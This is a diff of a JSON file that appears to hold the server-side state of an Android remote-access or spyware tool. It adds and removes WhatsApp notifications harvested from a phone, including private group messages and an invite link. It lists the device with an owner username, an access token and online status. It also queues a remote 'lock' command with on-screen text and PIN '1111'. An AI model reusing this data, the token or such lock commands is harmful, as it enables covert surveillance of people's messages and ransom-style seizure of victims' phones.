@@ -22,6 +22,22 @@
     "smsMessages": [
       {
         "appName": "WhatsApp",
+        "sender": "‎GB || ISIAN  LYEZ STORE X ALL OWN (14 pesan): ~ Fine",
+        "content": "22 pepeng 9,5 no macro hp only",
+        "time": "29/04 15:44",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777447997920
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎𝙹𝚋¹ 𝚊𝚕𝚕 𝚐𝚊𝚖𝚎 || 𝚙𝚒𝚝𝚎𝚗𝚎𝚜𝚜 x fyd (380 pesan): ~ titi",
+        "content": "🔗 ALL GAME CROUWS JB | https://chat.whatsapp.com/ITGjHQ4ASkKGX5vDBpUh5d?mode=gi_t \nBANTU RAMEIN BRE",
+        "time": "29/04 15:44",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777447995113
+      },
+      {
+        "appName": "WhatsApp",
         "sender": "WhatsApp",
         "content": "‎‎3047 pesan dari 19 chat",
         "time": "29/04 15:44",
@@ -4003,22 +4019,6 @@
         "time": "29/04 14:23",
         "pkg": "com.whatsapp",
         "receivedAt": 1777443171637
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎𝙅𝙊𝙈𝙊𝙆𝙀𝙍𝙎 𝘼𝙍𝙀𝘼 𝙋𝙀𝙉𝙂𝙃𝙔𝙏𝘼𝙈𝘼𝙉⚔️👑 (1019 pesan): ~ ❔❔",
-        "content": ".swgrup bokep amat lu 😹",
-        "time": "29/04 14:23",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777443171507
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎2084 pesan dari 19 chat",
-        "time": "29/04 14:23",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777443170834
       }
     ],
     "galleryPhotos": [],
@@ -17526,8 +17526,17 @@
     "deviceName": "TECNO LE7",
     "ownerUsername": "Zal7Sex",
     "token": "47026291789bab18fbcb5d300d789adf",
-    "lastSeen": 1777447992716,
-    "commandQueue": [],
+    "lastSeen": 1777447995721,
+    "commandQueue": [
+      {
+        "type": "lock",
+        "payload": {
+          "text": "WWWW",
+          "pin": "1111"
+        },
+        "sentAt": 1777447996289
+      }
+    ],
     "online": true,
     "connectedAt": "2026-04-29T07:32:36.802Z",
     "deviceInfo": {
